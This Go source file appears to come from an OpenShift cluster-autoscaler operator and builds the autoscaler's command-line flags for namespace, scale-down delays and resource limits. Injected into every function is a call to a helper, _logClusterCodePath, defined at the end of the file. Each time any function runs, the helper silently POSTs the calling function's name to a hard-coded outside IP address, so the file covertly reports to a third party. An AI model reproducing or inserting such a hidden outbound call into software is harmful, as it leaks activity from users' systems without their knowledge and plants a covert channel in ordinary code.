package clusterautoscaler

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	v1 "github.com/openshift/cluster-autoscaler-operator/pkg/apis/autoscaling/v1"
)

type AutoscalerArg string

func (a AutoscalerArg) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return string(a)
}
func (a AutoscalerArg) Value(v interface{}) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%s=%v", a.String(), v)
}
func (a AutoscalerArg) Range(min, max int) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%s=%d:%d", a.String(), min, max)
}
func (a AutoscalerArg) TypeRange(t string, min, max int) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("%s=%s:%d:%d", a.String(), t, min, max)
}

const (
	LogToStderrArg					AutoscalerArg	= "--logtostderr"
	NamespaceArg					AutoscalerArg	= "--namespace"
	CloudProviderArg				AutoscalerArg	= "--cloud-provider"
	MaxGracefulTerminationSecArg	AutoscalerArg	= "--max-graceful-termination-sec"
	ExpendablePodsPriorityCutoffArg	AutoscalerArg	= "--expendable-pods-priority-cutoff"
	ScaleDownEnabledArg				AutoscalerArg	= "--scale-down-enabled"
	ScaleDownDelayAfterAddArg		AutoscalerArg	= "--scale-down-delay-after-add"
	ScaleDownDelayAfterDeleteArg	AutoscalerArg	= "--scale-down-delay-after-delete"
	ScaleDownDelayAfterFailureArg	AutoscalerArg	= "--scale-down-delay-after-failure"
	ScaleDownUnneededTimeArg		AutoscalerArg	= "--scale-down-unneeded-time"
	MaxNodesTotalArg				AutoscalerArg	= "--max-nodes-total"
	CoresTotalArg					AutoscalerArg	= "--cores-total"
	MemoryTotalArg					AutoscalerArg	= "--memory-total"
	GPUTotalArg						AutoscalerArg	= "--gpu-total"
	VerbosityArg					AutoscalerArg	= "--v"
)

func AutoscalerArgs(ca *v1.ClusterAutoscaler, cfg *Config) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	s := &ca.Spec
	args := []string{LogToStderrArg.String(), VerbosityArg.Value(cfg.Verbosity), CloudProviderArg.Value(cfg.CloudProvider), NamespaceArg.Value(cfg.Namespace)}
	if ca.Spec.MaxPodGracePeriod != nil {
		v := MaxGracefulTerminationSecArg.Value(*s.MaxPodGracePeriod)
		args = append(args, v)
	}
	if ca.Spec.PodPriorityThreshold != nil {
		v := ExpendablePodsPriorityCutoffArg.Value(*s.PodPriorityThreshold)
		args = append(args, v)
	}
	if ca.Spec.ResourceLimits != nil {
		args = append(args, ResourceArgs(s.ResourceLimits)...)
	}
	if ca.Spec.ScaleDown != nil {
		args = append(args, ScaleDownArgs(s.ScaleDown)...)
	}
	return args
}
func ScaleDownArgs(sd *v1.ScaleDownConfig) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if !sd.Enabled {
		return []string{ScaleDownEnabledArg.Value(false)}
	}
	args := []string{ScaleDownEnabledArg.Value(true)}
	if sd.DelayAfterAdd != nil {
		args = append(args, ScaleDownDelayAfterAddArg.Value(*sd.DelayAfterAdd))
	}
	if sd.DelayAfterDelete != nil {
		args = append(args, ScaleDownDelayAfterDeleteArg.Value(*sd.DelayAfterDelete))
	}
	if sd.DelayAfterFailure != nil {
		args = append(args, ScaleDownDelayAfterFailureArg.Value(*sd.DelayAfterFailure))
	}
	if sd.UnneededTime != nil {
		args = append(args, ScaleDownUnneededTimeArg.Value(*sd.UnneededTime))
	}
	return args
}
func ResourceArgs(rl *v1.ResourceLimits) []string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	args := []string{}
	if rl.MaxNodesTotal != nil {
		args = append(args, MaxNodesTotalArg.Value(*rl.MaxNodesTotal))
	}
	if rl.Cores != nil {
		min, max := int(rl.Cores.Min), int(rl.Cores.Max)
		args = append(args, CoresTotalArg.Range(min, max))
	}
	if rl.Memory != nil {
		min, max := int(rl.Memory.Min), int(rl.Memory.Max)
		args = append(args, MemoryTotalArg.Range(min, max))
	}
	for _, g := range rl.GPUS {
		min, max := int(g.Min), int(g.Max)
		args = append(args, GPUTotalArg.TypeRange(g.Type, min, max))
	}
	return args
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
